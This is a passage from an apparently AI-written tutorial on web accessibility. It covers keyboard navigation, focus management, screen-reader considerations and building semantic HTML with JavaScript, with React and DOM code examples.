  const previousFocusRef = useRef();
  
  useEffect(() => {
    if (isOpen) {
      previousFocusRef.current = document.activeElement;
      
      // Focus first element
      const focusable = dialogRef.current.querySelectorAll(
        'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
      );
      if (focusable.length) {
        focusable[0].focus();
      }
    } else {
      // Restore focus
      previousFocusRef.current?.focus();
    }
  }, [isOpen]);
  
  const handleKeyDown = (e) => {
    if (e.key === 'Escape') {
      onClose();
    }
  };
  
  if (!isOpen) return null;
  
  return (
    <div
      ref={dialogRef}
      role="dialog"
      aria-modal="true"
      onKeyDown={handleKeyDown}
    >
      {children}
    </div>
  );
}
```

#### Roving Tabindex Hook

```javascript
import { useState, useEffect, useRef } from 'react';

function useRovingTabindex(itemsCount) {
  const [currentIndex, setCurrentIndex] = useState(0);
  const itemRefs = useRef([]);
  
  const handleKeyDown = (e, index) => {
    let newIndex;
    
    switch(e.key) {
      case 'ArrowDown':
      case 'ArrowRight':
        e.preventDefault();
        newIndex = (index + 1) % itemsCount;
        break;
      case 'ArrowUp':
      case 'ArrowLeft':
        e.preventDefault();
        newIndex = (index - 1 + itemsCount) % itemsCount;
        break;
      case 'Home':
        e.preventDefault();
        newIndex = 0;
        break;
      case 'End':
        e.preventDefault();
        newIndex = itemsCount - 1;
        break;
      default:
        return;
    }
    
    setCurrentIndex(newIndex);
    itemRefs.current[newIndex]?.focus();
  };
  
  const getItemProps = (index) => ({
    ref: (el) => itemRefs.current[index] = el,
    tabIndex: index === currentIndex ? 0 : -1,
    onKeyDown: (e) => handleKeyDown(e, index),
    onFocus: () => setCurrentIndex(index)
  });
  
  return { currentIndex, getItemProps };
}

// Usage
function List({ items }) {
  const { getItemProps } = useRovingTabindex(items.length);
  
  return (
    <ul role="list">
      {items.map((item, i) => (
        <li key={item.id} {...getItemProps(i)}>
          {item.content}
        </li>
      ))}
    </ul>
  );
}
```

### Testing Keyboard Navigation

#### Manual Testing Checklist

1. Tab through all interactive elements in logical order
2. Verify visible focus indicators on all focusable elements
3. Test reverse tab (Shift + Tab) navigation
4. Verify keyboard shortcuts don't conflict with browser/screen reader
5. Test arrow key navigation in custom components
6. Verify Escape closes modals and returns focus
7. Test Enter and Space on buttons and custom controls
8. Verify skip links function correctly
9. Test with screen reader keyboard commands
10. Verify form submission with Enter key

#### Automated Testing

```javascript
// Example using Testing Library
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('tabs can be navigated with arrow keys', async () => {
  const user = userEvent.setup();
  render(<TabList tabs={mockTabs} />);
  
  const firstTab = screen.getByRole('tab', { name: 'First' });
  const secondTab = screen.getByRole('tab', { name: 'Second' });
  
  firstTab.focus();
  expect(firstTab).toHaveFocus();
  
  await user.keyboard('{ArrowRight}');
  expect(secondTab).toHaveFocus();
  
  await user.keyboard('{ArrowLeft}');
  expect(firstTab).toHaveFocus();
});

test('modal traps focus', async () => {
  const user = userEvent.setup();
  const onClose = jest.fn();
  
  render(<Modal isOpen={true} onClose={onClose} />);
  
  const closeButton = screen.getByRole('button', { name: 'Close' });
  const submitButton = screen.getByRole('button', { name: 'Submit' });
  
  closeButton.focus();
  expect(closeButton).toHaveFocus();
  
  // Tab forward should wrap to last element
  await user.keyboard('{Tab}');
  expect(submitButton).toHaveFocus();
  
  await user.keyboard('{Tab}');
  expect(closeButton).toHaveFocus();
  
  // Escape should close
  await user.keyboard('{Escape}');
  expect(onClose).toHaveBeenCalled();
});
```

### Performance Considerations

#### Debouncing Keyboard Events

For expensive operations triggered by keyboard input:

```javascript
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

const handleSearch = debounce((query) => {
  // Expensive search operation
  performSearch(query);
}, 300);

searchInput.addEventListener('input', (e) => {
  handleSearch(e.target.value);
});
```

#### Throttling Arrow Key Navigation

For rapid navigation events:

```javascript
function throttle(func, limit) {
  let inThrottle;
  return function executedFunction(...args) {
    if (!inThrottle) {
      func(...args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

const handleArrowKey = throttle((direction) => {
  navigateToItem(direction);
}, 100);

element.addEventListener('keydown', (e) => {
  if (e.key.startsWith('Arrow')) {
    e.preventDefault();
    handleArrowKey(e.key);
  }
});
```

### Browser Compatibility

Modern keyboard event handling is widely supported, but some considerations remain:

- `event.key` is supported in all modern browsers; older implementations may require fallbacks to `event.keyCode`
- `focus-visible` pseudo-class has good support but may require a polyfill for older browsers
- Some mobile browsers may not trigger keyboard events for virtual keyboards in expected ways

[Inference: Testing across browsers and devices remains important for keyboard navigation implementations, particularly for mobile experiences where behavior can vary significantly.]

---

## Focus Management in the DOM

### Focus State and the Active Element

The browser maintains a single focus context at any given time, accessible via `document.activeElement`. This property returns the currently focused element, or `<body>` if no interactive element has focus. The focus state determines which element receives keyboard events and is critical for both user interaction and accessibility.

```javascript
// Query current focus
const focused = document.activeElement;

// Check if specific element has focus
if (element === document.activeElement) {
  // Element is focused
}
```

### Focusable Elements

Elements are focusable if they meet specific criteria. Natively focusable elements include form controls (`<input>`, `<button>`, `<select>`, `<textarea>`), links (`<a>` with `href`), and certain interactive elements (`<audio>`, `<video>` with `controls`). Non-interactive elements become focusable when assigned `tabindex`.

The `tabindex` attribute controls focusability and tab order:

- `tabindex="0"` — Element enters natural tab order
- `tabindex="-1"` — Programmatically focusable, excluded from tab sequence
- `tabindex="1+"` — Custom tab order (generally discouraged)

```javascript
// Make div focusable but skip in tab order
div.tabIndex = -1;

// Add to natural tab order
div.tabIndex = 0;
```

### Programmatic Focus Control

Focus can be controlled programmatically using `focus()` and `blur()` methods. The `focus()` method accepts options to control behavior:

```javascript
// Basic focus
element.focus();

// Focus with options
element.focus({
  preventScroll: true,  // Don't scroll element into view
  focusVisible: true    // [Inference] Force visible focus indicator
});

// Remove focus
element.blur();
```

The `focusVisible` option is **[Unverified]** — browser support and exact behavior may vary across implementations.

### Focus Events

Four primary focus events exist in the DOM:

**focus** — Fires when element receives focus (does not bubble) **blur** — Fires when element loses focus (does not bubble) **focusin** — Fires when element receives focus (bubbles) **focusout** — Fires when element loses focus (bubbles)

```javascript
// Non-bubbling events (use capture or direct attachment)
input.addEventListener('focus', (e) => {
  console.log('Input focused');
});

// Bubbling events (can delegate)
form.addEventListener('focusin', (e) => {
  console.log('Something in form focused:', e.target);
});
```

The `relatedTarget` property on focus events indicates the element losing focus (for `focus`/`focusin`) or gaining focus (for `blur`/`focusout`):

```javascript
input.addEventListener('blur', (e) => {
  console.log('Lost focus to:', e.relatedTarget);
});
```

### Focus Trapping

Focus trapping confines keyboard navigation within a specific container, essential for modals, dialogs, and overlays. Implementation requires intercepting Tab key events and cycling focus among focusable descendants:

```javascript
function trapFocus(container) {
  const focusableSelectors = 'a[href], button:not([disabled]), textarea:not([disabled]), input:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])';
  
  const focusable = Array.from(
    container.querySelectorAll(focusableSelectors)
  );
  
  const firstFocusable = focusable[0];
  const lastFocusable = focusable[focusable.length - 1];
  
  container.addEventListener('keydown', (e) => {
    if (e.key !== 'Tab') return;
    
    if (e.shiftKey) {
      if (document.activeElement === firstFocusable) {
        e.preventDefault();
        lastFocusable.focus();
      }
    } else {
      if (document.activeElement === lastFocusable) {
        e.preventDefault();
        firstFocusable.focus();
      }
    }
  });
}
```

**[Inference]**: This approach cycles focus but doesn't account for dynamically added/removed elements or nested focus traps.

### Focus Restoration

Restoring focus after transient UI changes maintains user context and keyboard navigation continuity:

```javascript
// Store reference before UI change
const previousFocus = document.activeElement;

// After UI update completes
if (previousFocus && typeof previousFocus.focus === 'function') {
  previousFocus.focus();
}
```

Focus restoration is critical when:

- Closing modals/dialogs
- Removing elements that had focus
- Completing form submissions
- Dismissing notifications

### Focus Indicators and :focus-visible

The `:focus` pseudo-class applies whenever an element has focus, regardless of input method. The `:focus-visible` pseudo-class applies when the browser determines a visible focus indicator should be shown, typically for keyboard navigation:

```css
/* Always show focus styles */
button:focus {
  outline: 2px solid blue;
}

/* Show only for keyboard navigation */
button:focus-visible {
  outline: 2px solid blue;
}

/* Remove outline for mouse/touch, keep for keyboard */
button:focus:not(:focus-visible) {
  outline: none;
}
```

**[Inference]**: The browser's heuristic for `:focus-visible` typically triggers on keyboard navigation but exact behavior varies.

### Focus Management in Shadow DOM

Shadow DOM creates isolated focus contexts. Focus events do not cross shadow boundaries by default unless using composed events:

```javascript
const shadow = element.attachShadow({ mode: 'open' });

// Focus events don't escape shadow root by default
shadow.addEventListener('focusin', (e) => {
  console.log('Composed:', e.composed); // true for focusin/focusout
});
```

`focusin` and `focusout` are composed events (cross shadow boundaries), while `focus` and `blur` are not. When querying focus within shadow DOM:

```javascript
// Active element in main document
const docActive = document.activeElement;

// Active element within shadow root
const shadowActive = shadowRoot.activeElement;
```

### Focus Order and Tab Navigation

Tab order follows document order for elements with `tabindex="0"` or naturally focusable elements. Positive `tabindex` values create custom ordering (values 1+ focused before natural order), but this pattern is discouraged:

```html
<!-- Natural tab order: 1, 2, 3 -->
<button>First</button>
<button>Second</button>
<button>Third</button>

<!-- Disrupted order: 2, 3, 1 (avoid this) -->
<button tabindex="2">First</button>
<button tabindex="3">Second</button>
<button tabindex="1">Third</button>
```

Maintain logical tab order by structuring HTML in reading order rather than manipulating `tabindex`.

### Focus Management in SPAs

Single-page applications require manual focus management during route changes and dynamic content updates:

```javascript
// Route change handler
router.on('change', (route) => {
  // Update content
  renderRoute(route);
  
  // Focus management strategy depends on change type
  const mainContent = document.querySelector('main');
  
  // Option 1: Focus main content container
  if (!mainContent.hasAttribute('tabindex')) {
    mainContent.tabIndex = -1;
  }
  mainContent.focus();
  
  // Option 2: Focus first heading
  const heading = mainContent.querySelector('h1, h2');
  if (heading) {
    heading.tabIndex = -1;
    heading.focus();
  }
});
```

### Delegated Focus in Shadow DOM

The `delegatesFocus` option in Shadow DOM automatically focuses the first focusable descendant when the shadow host receives focus:

```javascript
const shadow = element.attachShadow({ 
  mode: 'open',
  delegatesFocus: true 
});

// When element receives focus, first focusable child is focused instead
element.focus(); // Actually focuses first input, button, etc. in shadow
```

This simplifies focus management for custom components by eliminating manual redirection logic.

### Focus and Scroll Behavior

By default, calling `focus()` scrolls the element into view. This can be controlled:

```javascript
// Prevent automatic scroll
element.focus({ preventScroll: true });

// Manual scroll control after focus
element.scrollIntoView({ 
  behavior: 'smooth',
  block: 'center' 
});
```

### Inert Attribute and Focus Management

The `inert` attribute removes elements from focus order and interaction:

```html
<div inert>
  <!-- All interactive elements become unfocusable and unclickable -->
  <button>Cannot be focused or clicked</button>
  <input type="text">
</div>
```

**[Inference]**: Browser support for `inert` is modern; older browsers may require polyfills. The attribute is particularly useful for implementing modal overlays where background content should be completely inaccessible.

### Focus Management with ARIA

ARIA attributes coordinate with focus management:

- `aria-activedescendant` — Indicates which descendant has virtual focus in composite widgets
- `role="dialog"` with `aria-modal="true"` — Signals assistive technology that focus is trapped
- `aria-hidden="true"` — Hides content from assistive technology (should match `inert` or focus trapping)

```javascript
// Composite widget pattern
const listbox = document.querySelector('[role="listbox"]');
const options = listbox.querySelectorAll('[role="option"]');
let activeIndex = 0;

listbox.addEventListener('keydown', (e) => {
  if (e.key === 'ArrowDown') {
    activeIndex = Math.min(activeIndex + 1, options.length - 1);
    listbox.setAttribute('aria-activedescendant', options[activeIndex].id);
  }
});
```

### Focus Management Performance

Frequent focus changes can impact performance, particularly with complex DOMs or many focus listeners:

```javascript
// Avoid rapid focus changes in tight loops
// Bad pattern:
elements.forEach(el => {
  el.focus();
  processElement(el);
});

// Better: Focus once at end
let targetElement;
elements.forEach(el => {
  if (shouldFocus(el)) targetElement = el;
  processElement(el);
});
if (targetElement) targetElement.focus();
```

**[Inference]**: The performance impact depends on listener count, DOM complexity, and browser rendering optimizations.

### Document Visibility and Focus

Focus behavior changes when documents are hidden or backgrounded:

```javascript
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    // Document backgrounded - focus events may not fire normally
  } else {
    // Document visible again - may need to restore focus context
    restoreFocusContext();
  }
});
```

**[Unverified]**: Exact focus event behavior when documents transition between visible/hidden states may vary across browsers and contexts.

---

## Screen Reader Considerations

### Understanding Screen Reader Navigation Patterns

Screen readers traverse content through multiple navigation modes. Users switch between reading all content sequentially (browse mode) and jumping between specific elements (focus mode or forms mode). The navigation experience depends heavily on semantic HTML structure, as screen readers build an internal representation of the page's document outline and interactive elements.

Users employ various navigation strategies: heading navigation (jumping between h1-h6 elements), landmark navigation (moving between ARIA landmarks or HTML5 semantic elements), link lists (accessing all links at once), form control navigation, and table navigation. Each strategy requires specific markup patterns to function effectively.

### Semantic HTML and Document Structure

**Heading Hierarchy**

Maintain strict heading order without skipping levels. Screen readers generate heading menus that users rely on for page overview and navigation. A page with h1 → h3 → h2 creates confusion in this mental model. Multiple h1 elements are acceptable in HTML5 when used within distinct sectioning elements (article, section), though single h1 patterns remain safer for broader screen reader support.

**Landmark Regions**

Define page structure using semantic elements or ARIA landmarks: `<header>`, `<nav>`, `<main>`, `<aside>`, `<footer>`, or their ARIA equivalents (`role="banner"`, `role="navigation"`, `role="main"`, `role="complementary"`, `role="contentinfo"`). Screen readers provide landmark navigation shortcuts, allowing users to jump directly to main content or navigation. Multiple landmarks of the same type require `aria-label` or `aria-labelledby` to distinguish them ("Primary Navigation" vs "Footer Navigation").

**List Structures**

Use proper list markup (`<ul>`, `<ol>`, `<dl>`) for related items. Screen readers announce list presence and item count, helping users understand content grouping. Navigation menus should be unordered lists within nav elements. Presentational list styling can be removed with CSS while maintaining semantic structure.

### Alternative Text Strategies

**Informative Images**

Alt text should convey the information or function the image provides, not describe its appearance. For a chart showing sales decline, use "Sales decreased 23% from Q1 to Q2" rather than "Bar chart with red and blue bars." Context matters—the same image may need different alt text in different contexts.

**Functional Images**

Images within links or buttons require alt text describing the action, not the image. A magnifying glass icon in a search button should have `alt="Search"` not `alt="Magnifying glass."` If text already describes the function, the image can be decorative.

**Decorative Images**

Use empty alt (`alt=""`) for purely decorative images. This tells screen readers to skip the image entirely. Never omit the alt attribute—missing alt causes screen readers to announce the filename, creating noise. Background images in CSS are automatically ignored by screen readers.

**Complex Images**

Charts, diagrams, and infographics need extended descriptions beyond alt text's brief summary. Use `aria-describedby` pointing to a visible or visually-hidden full description, or `<figure>` with `<figcaption>` containing the detailed explanation. The alt text provides the conclusion; the long description provides the supporting data.

**Text in Images**

Avoid text in images. When unavoidable, the alt text must contain all text from the image verbatim, plus any contextual information the visual design conveys. Better: use actual text styled with CSS.

### Focus Management and Keyboard Interaction

**Focus Visibility**

Never remove focus indicators with `outline: none` without providing alternative visible focus styles. Users navigating by keyboard rely entirely on focus indicators to track their position. Enhanced focus styles (thicker outlines, background changes, shadows) improve usability for everyone. Consider `:focus-visible` to show enhanced focus only for keyboard users while maintaining minimal styling for mouse users.

**Focus Order**

Tab order should follow logical reading order, typically left-to-right, top-to-bottom. CSS positioning that creates visual order different from DOM order confuses keyboard users. Use `tabindex="0"` sparingly to add non-interactive elements to tab order only when necessary. Avoid positive tabindex values (tabindex="1", "2", etc.) as they create unpredictable tab sequences.

**Focus Traps**

Modal dialogs and overlays must trap focus within themselves while open. When a modal opens, focus moves to the modal (typically the close button or first interactive element). Tab cycles through modal elements only. Escape key closes the modal and returns focus to the trigger element. Without focus trapping, users can tab behind the modal to obscured content.

**Skip Links**

Provide "Skip to main content" links as the first focusable element. These can be visually hidden until focused, appearing only for keyboard users. Skip links allow bypassing repetitive navigation on every page, critical for screen reader efficiency.

### ARIA Attributes and Their Usage

**aria-label and aria-labelledby**

Use `aria-label` to provide accessible names for elements lacking visible labels. Use `aria-labelledby` to reference existing visible text as the accessible name. `aria-labelledby` takes precedence over aria-label, which takes precedence over visible text content. Multiple IDs in aria-labelledby concatenate their text. These attributes don't change visible content—they only affect screen reader announcements.

**aria-describedby**

References supplementary descriptive text. Unlike labeling attributes, aria-describedby provides additional context announced after the element's name and role. Use for error messages, help text, or detailed descriptions. Multiple elements can share the same aria-describedby target.

**aria-live Regions**

Announce dynamic content changes without moving focus. `aria-live="polite"` waits for the user to pause before announcing; `aria-live="assertive"` interrupts immediately (use sparingly for critical alerts). The live region must exist in the DOM before content changes occur—adding a new live region doesn't trigger announcements. Common pattern: include empty live regions in initial markup, then populate them with messages.

`role="status"` (implicit `aria-live="polite"`) and `role="alert"` (implicit `aria-live="assertive"`) provide semantic meaning beyond live region behavior. Use these roles instead of bare aria-live when appropriate.

**aria-hidden**

`aria-hidden="true"` removes elements from screen reader accessibility trees while keeping them visually present. Critical use case: decorative icons alongside text labels. Never use on focusable elements—this creates keyboard-accessible but unannounced controls. `aria-hidden="false"` has no effect (doesn't override CSS `display: none` or `visibility: hidden`).

**State and Property Attributes**

Communicate element states: `aria-expanded` for toggles, `aria-pressed` for toggle buttons, `aria-current` for current page/step, `aria-selected` for selected items, `aria-checked` for custom checkboxes. These must update dynamically with JavaScript as states change. Screen readers don't automatically detect visual state changes—explicit ARIA state updates are required.

### Form Accessibility

**Label Association**

Every form control requires an associated label. Explicit association: `<label for="id">` referencing the input's ID. Implicit association: wrapping the input in the label element. Explicit association provides broader screen reader support and larger click targets. Placeholder text is not a substitute for labels—it disappears on input and has contrast issues.

**Fieldsets and Legends**

Group related form controls with `<fieldset>` and `<legend>`. Essential for radio button groups and checkbox groups where individual labels lack context. Screen readers announce the legend before each control label within the fieldset. For example: legend "Shipping method" provides context for radio labels "Standard" and "Express."

**Error Identification and Descriptions**

Error messages must be programmatically associated with their controls using `aria-describedby`. The control should receive `aria-invalid="true"` when in error state. Announce errors in live regions immediately after validation. Provide specific guidance on correction, not just "This field is required" but "Email address is required" or "Password must be at least 8 characters."

Error summaries at form tops help users understand all issues before correction. Link each error message to its corresponding field (clicking focuses the field). Announce the error count in the summary heading.

**Required Fields**

Mark required fields with `required` attribute (HTML5) or `aria-required="true"`. Indicate required status visually and in label text. Asterisks alone are insufficient—include text like "(required)" or announce "required" in screen reader-only text within the label.

**Custom Form Controls**

Custom dropdowns, date pickers, and toggles require extensive ARIA implementation. Use `role="combobox"` with `aria-expanded`, `aria-controls`, and `aria-activedescendant` for custom selects. Implement full keyboard support matching native controls (arrow keys, Enter, Escape, etc.). Consider whether custom controls provide sufficient value to justify their accessibility complexity—native controls are accessible by default.

### Table Accessibility

**Table Structure**

Use `<th>` for header cells, `<td>` for data cells. Screen readers announce header context for each data cell, but only if properly marked. `<caption>` provides the table's title/summary. Use `<thead>`, `<tbody>`, and `<tfoot>` to define table sections for better navigation.

**Scope Attribute**

Add `scope="col"` or `scope="row"` to header cells to explicitly define header-data relationships. Required for complex tables with ambiguous header relationships. Simple single-row or single-column header tables can rely on implicit scope, but explicit scope provides better compatibility.

**Headers Attribute**

For complex tables with multiple header levels or headers that don't align directly with their data cells, use the `headers` attribute on data cells, referencing the IDs of all relevant header cells. This creates explicit associations when scope is insufficient.

**Layout Tables**

Never use tables for layout. If absolutely required for legacy support, use `role="presentation"` or `role="none"` to remove table semantics, preventing screen readers from announcing table structure. [Unverified claim about broad support]: While most modern screen readers support these roles, testing across specific screen reader/browser combinations is necessary.

### Dynamic Content and Single Page Applications

**Page Title Updates**

Update `document.title` when view changes in SPAs. Screen readers announce title changes, helping users confirm navigation. Format: "Page Name - Site Name" for consistency.

**Focus Management on Navigation**

Move focus to a logical element after route changes: the main heading, skip link, or a wrapper element made focusable with `tabindex="-1"`. Without focus management, users don't receive confirmation that navigation occurred and may remain disoriented on the "new" page.

**Loading States**

Announce loading states to screen readers using live regions. Pattern: aria-live region announces "Loading..." when request starts, then announces "Content loaded" or specific result count when complete. Provide accessible loading indicators beyond visual spinners.

**Infinite Scroll**

Announce when new content loads. Provide manual "Load more" buttons as fallback—infinite scroll without user control can be overwhelming. Consider pagination as a more accessible alternative, though [Inference] infinite scroll with proper announcements and controls can work if implemented carefully.

### Screen Reader-Only Content

**Visually Hidden Technique**

CSS pattern for screen reader-only content:

```css
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}
```

Avoid `display: none` or `visibility: hidden` which also hide from screen readers. Use for supplementary context, like "Current page" indicators in navigation or icon-only button text.

**Focus Reveal**

Make sr-only content visible on focus for keyboard users who aren't using screen readers. Add `:focus` styles that reverse the hiding.

### Timing and Auto-Updates

**Carousels and Slideshows**

Provide pause buttons for automatic transitions. Screen readers need time to read content before it changes. Include accessible next/previous controls and position indicators. Ensure all slides are keyboard accessible, not just the visible slide.

**Time Limits**

Allow users to extend or disable time limits on forms and sessions. Provide warnings with adjustable timeouts. Screen reader users need more time to complete tasks due to sequential navigation.

**Auto-Playing Media**

Don't auto-play media, or provide immediate pause controls. Auto-play interferes with screen reader audio. If auto-play is necessary, mute by default and provide unmute controls.

### Testing Approaches

**Keyboard Testing**

Navigate the entire interface using only keyboard. Tab through all interactive elements. Activate controls with Enter/Space. Use arrow keys in components that support them. Ensure all functionality is accessible without mouse. Verify focus visibility at all times.

**Screen Reader Testing**

Test with actual screen readers: NVDA or JAWS on Windows, VoiceOver on macOS/iOS, TalkBack on Android. Screen reader behavior varies significantly between different screen readers and browsers. Testing in one combination doesn't guarantee accessibility in others.

Common testing patterns: navigate by headings, navigate by landmarks, navigate by forms mode, activate links and buttons, fill out forms, interact with custom widgets. Listen for confusion points where announcements are unclear or missing context.

**Automated Testing**

Tools like axe, WAVE, and Lighthouse catch common issues: missing alt text, insufficient color contrast, missing form labels, invalid ARIA. However, [Inference based on technical limitations] automated tools detect roughly 30-40% of accessibility issues. They can't evaluate whether alt text is meaningful, whether focus order is logical, or whether interactions make sense. Manual testing remains essential.

### Common Antipatterns

**Div and Span Soup**

Building interactive components from generic divs with click handlers creates elements screen readers don't recognize as interactive. Use semantic HTML (`<button>`, `<a>`, `<input>`) which includes built-in keyboard support, focus management, and screen reader announcements. If using divs, add appropriate roles, tabindex, and keyboard handlers—extensive work to replicate what native elements provide.

**Click Events on Non-Interactive Elements**

Adding click handlers to divs, spans, or paragraphs without making them keyboard accessible. These elements aren't in the tab order and don't respond to Enter/Space. Either use proper interactive elements or add `tabindex="0"`, `role="button"`, and keyboard event handlers.

**Redundant ARIA**

Adding ARIA to elements that already have implicit semantics. `<button role="button">` is redundant. `<nav role="navigation">` is redundant in modern browsers. The "First Rule of ARIA" is to use native HTML when possible rather than adding ARIA to generic elements.

**Incorrect ARIA Usage**

Using `aria-label` on divs without roles gives them no accessible name—divs aren't named elements. Using `role="button"` without keyboard support creates buttons that keyboard users can't activate. Using `aria-hidden="true"` on focusable elements creates invisible focused elements. ARIA is powerful but requires understanding when and how to apply it correctly.

**Icon-Only Buttons Without Labels**

Buttons containing only icons (Unicode symbols, icon fonts, SVGs) without accessible text. Screen readers announce "button" without describing the button's purpose. Add aria-label, sr-only text, or ensure SVGs contain `<title>` elements.

---

## Semantic HTML via JavaScript

### Dynamic Semantic Structure Creation

JavaScript enables programmatic generation of semantic HTML elements that maintain meaningful document structure. Use `document.createElement()` with appropriate semantic tags rather than generic containers:

```javascript
// Create semantic article structure
const article = document.createElement('article');
const header = document.createElement('header');
const h2 = document.createElement('h2');
const time = document.createElement('time');
time.setAttribute('datetime', '2025-12-15');
time.textContent = 'December 15, 2025';

header.appendChild(h2);
header.appendChild(time);
article.appendChild(header);
```

### Preserving Semantic Meaning in DOM Manipulation

When manipulating existing DOM structures, maintain semantic integrity by respecting document outline and hierarchy:

```javascript
// Maintain proper heading hierarchy
function insertSection(parentElement, level) {
  const section = document.createElement('section');
  const heading = document.createElement(`h${level}`);
  section.appendChild(heading);
  parentElement.appendChild(section);
  return section;
}
```

### ARIA Attributes and Roles Management

JavaScript manages ARIA attributes to enhance semantic meaning for assistive technologies:

```javascript
// Dynamic ARIA state management
const button = document.querySelector('[aria-expanded]');
button.addEventListener('click', () => {
  const expanded = button.getAttribute('aria-expanded') === 'true';
  button.setAttribute('aria-expanded', !expanded);
  
  const controls = document.getElementById(button.getAttribute('aria-controls'));
  controls.hidden = expanded;
});

// Live region updates
const status = document.querySelector('[role="status"]');
status.setAttribute('aria-live', 'polite');
status.textContent = 'Content updated';
```

### Semantic Navigation Patterns

Construct navigation structures that maintain semantic clarity:

```javascript
// Build semantic navigation
function createNavigation(items) {
  const nav = document.createElement('nav');
  nav.setAttribute('aria-label', 'Main navigation');
  
  const ul = document.createElement('ul');
  items.forEach(item => {
    const li = document.createElement('li');
    const a = document.createElement('a');
    a.href = item.url;
    a.textContent = item.label;
    li.appendChild(a);
    ul.appendChild(li);
  });
  
  nav.appendChild(ul);
  return nav;
}
```

### Form Semantics and Validation

JavaScript enhances form semantics through proper labeling, fieldset grouping, and validation feedback:

```javascript
// Semantic form construction
function createFormField(config) {
  const wrapper = document.createElement('div');
  
  const label = document.createElement('label');
  label.setAttribute('for', config.id);
  label.textContent = config.labelText;
  
  const input = document.createElement('input');
  input.id = config.id;
  input.type = config.type;
  input.name = config.name;
  input.required = config.required;
  
  if (config.describedBy) {
    const description = document.createElement('span');
    description.id = `${config.id}-desc`;
    description.textContent = config.describedBy;
    input.setAttribute('aria-describedby', description.id);
    wrapper.appendChild(description);
  }
  
  wrapper.appendChild(label);
  wrapper.appendChild(input);
  return wrapper;
}

// Validation with semantic error messaging
function displayError(input, message) {
  const errorId = `${input.id}-error`;
  let errorElement = document.getElementById(errorId);
  
  if (!errorElement) {
    errorElement = document.createElement('span');
    errorElement.id = errorId;
    errorElement.setAttribute('role', 'alert');
    errorElement.className = 'error-message';
    input.parentElement.appendChild(errorElement);
  }
  
  input.setAttribute('aria-invalid', 'true');
  input.setAttribute('aria-describedby', errorId);
  errorElement.textContent = message;
}
```

### Landmark Regions and Document Structure

Programmatically establish landmark regions for improved navigation:

```javascript
// Create semantic page structure
function buildPageStructure() {
  const container = document.createElement('div');
  
  const header = document.createElement('header');
  header.setAttribute('role', 'banner');
  
  const main = document.createElement('main');
  main.setAttribute('role', 'main');
  main.id = 'main-content';
  
  const aside = document.createElement('aside');
  aside.setAttribute('role', 'complementary');
  aside.setAttribute('aria-label', 'Related content');
  
  const footer = document.createElement('footer');
  footer.setAttribute('role', 'contentinfo');
  
  container.append(header, main, aside, footer);
  return container;
}
```

### Lists and Grouping Elements

Maintain semantic list structures when adding dynamic content:

```javascript
// Semantic list management
class SemanticList {
  constructor(type = 'ul') {
    this.list = document.createElement(type);
  }
  
  addItem(content, subItems = []) {
    const li = document.createElement('li');
    
    if (typeof content === 'string') {
      li.textContent = content;
    } else {
      li.appendChild(content);
    }
    
    if (subItems.length > 0) {
      const subList = document.createElement(this.list.tagName);
      subItems.forEach(subContent => {
        const subLi = document.createElement('li');
        subLi.textContent = subContent;
        subList.appendChild(subLi);
      });
      li.appendChild(subList);
    }
    
    this.list.appendChild(li);
  }
  
  getList() {
    return this.list;
  }
}

// Description list for key-value pairs
function createDescriptionList(data) {
  const dl = document.createElement('dl');
  
  Object.entries(data).forEach(([term, description]) => {
    const dt = document.createElement('dt');
    dt.textContent = term;
    
    const dd = document.createElement('dd');
    dd.textContent = description;
    
    dl.appendChild(dt);
    dl.appendChild(dd);
  });
  
  return dl;
}
```

### Tables with Proper Structure

Generate tables that maintain semantic relationships between headers and data:

```javascript
// Semantic table construction
function createSemanticTable(data, headers) {
  const table = document.createElement('table');
  
  // Caption for context
  const caption = document.createElement('caption');
  caption.textContent = data.title;
  table.appendChild(caption);
  
  // Table header
  const thead = document.createElement('thead');
  const headerRow = document.createElement('tr');
  headers.forEach(header => {
    const th = document.createElement('th');
    th.textContent = header.label;
    th.scope = 'col';
    if (header.abbr) th.setAttribute('abbr', header.abbr);
    headerRow.appendChild(th);
  });
  thead.appendChild(headerRow);
  table.appendChild(thead);
  
  // Table body
  const tbody = document.createElement('tbody');
  data.rows.forEach(row => {
    const tr = document.createElement('tr');
    row.forEach((cell, index) => {
      const td = document.createElement('td');
      td.textContent = cell;
      if (headers[index].id) {
        td.setAttribute('headers', headers[index].id);
      }
      tr.appendChild(td);
    });
    tbody.appendChild(tr);
  });
  table.appendChild(tbody);
  
  return table;
}
```

### Interactive Widgets and Components

Build accessible interactive components with proper semantic roles and states:

```javascript
// Accordion pattern
class SemanticAccordion {
  constructor(items) {
    this.element = document.createElement('div');
    this.element.className = 'accordion';
    
    items.forEach((item, index) => {
      const section = this.createAccordionItem(item, index);
      this.element.appendChild(section);
    });
  }
  
  createAccordionItem(item, index) {
    const heading = document.createElement('h3');
    
    const button = document.createElement('button');
    button.id = `accordion-btn-${index}`;
    button.setAttribute('aria-expanded', 'false');
    button.setAttribute('aria-controls', `accordion-panel-${index}`);
    button.textContent = item.title;
    
    const panel = document.createElement('div');
    panel.id = `accordion-panel-${index}`;
    panel.setAttribute('role', 'region');
    panel.setAttribute('aria-labelledby', button.id);
    panel.hidden = true;
    panel.innerHTML = item.content;
    
    button.addEventListener('click', () => {
      const expanded = button.getAttribute('aria-expanded') === 'true';
      button.setAttribute('aria-expanded', !expanded);
      panel.hidden = expanded;
    });
    
    heading.appendChild(button);
    
    const wrapper = document.createElement('div');
    wrapper.append(heading, panel);
    return wrapper;
  }
  
  getElement() {
    return this.element;
  }
}

// Tab interface
class SemanticTabs {
  constructor(tabs) {
    this.container = document.createElement('div');
    this.tablist = document.createElement('div');
    this.tablist.setAttribute('role', 'tablist');
    this.tablist.setAttribute('aria-label', 'Content tabs');
    
    this.panels = [];
    
    tabs.forEach((tab, index) => {
      this.createTab(tab, index);
    });
    
    this.container.appendChild(this.tablist);
    this.panels.forEach(panel => this.container.appendChild(panel));
  }
